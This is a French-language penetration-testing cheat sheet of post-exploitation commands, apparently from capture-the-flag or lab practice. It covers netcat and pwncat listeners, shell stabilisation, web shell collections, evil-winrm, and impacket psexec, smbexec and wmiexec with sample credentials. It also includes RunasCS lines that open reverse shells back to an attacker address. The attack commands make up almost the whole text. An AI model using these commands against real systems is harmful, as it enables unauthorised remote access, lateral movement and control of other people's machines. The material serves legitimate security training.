
# Listeneur

## Netcat

```
nc -lnvp 1234
```

## Pwncat

```
pwncat -l 1234
```

```
ctrl + D    # Vrai shell
privesc -l
```

## Shell stable

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
www-data@target$ ^Z

4th3n4x@kali[/]$ stty raw -echo
4th3n4x@kali[/]$ fg

[Enter]
[Enter]
www-data@target$

4th3n4x@kali[/]$ echo $TERM
xterm-256color

4th3n4x@htb[/htb]$ stty size
67 318

www-data@remotehost$ export TERM=xterm-256color
www-data@remotehost$ stty rows 67 columns 318
```

```
/bin/bash -i
perl —e 'exec "/bin/sh";'
```

## Meterpreter

```
shell
SHELL=/bin/bash script -q /dev/null
```

# Web Shell

```
──(kali㉿kali)-[~]
└─$ laudanum       

> laudanum ~ Collection of injectable web files

/usr/share/laudanum
├── asp
├── aspx
├── cfm
├── helpers
├── jsp
├── php
└── wordpress
```

```
nishang/Antak-WebShell
[wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
```
# Connection à distance

## Winrm

```
evil-winrm
```

## RDP

```
xfreerdp /u:jim /p:'Castello1!' /v:172.16.114.30 /cert:ignore /drive:linux,/home/kali
```

# Impacket

## SMBexec

```
impacket-smbexec user:'pass123'@domaine.local
```

## PSexec
```
impacket-psexec user:'pass123'@domaine.local
```

## DCOMexec
```
impacket-dcomexec user:'pass123'@domaine.local
```

## WMIexec
```
impacket-wmiexec user:'pass123'@domaine.local
```

# Exécuter à la place d'un autre utilisateur

## Linux

```
sudo -u username command
```

## Windows

### PowerShell

```
Start-Process -FilePath "path\to\command" -Credential (Get-Credential)
Start-Process "runas" -ArgumentList "/user:domain\username cmd.exe"
```

### Runas

```
runas /user:domain\username "cmd.exe"
```

### RunasCS.exe

```
runasCS.exe admin password "nc ip port"
./runas.exe mikasa IL0v3 powershell -r 10.10.14.177:1235
```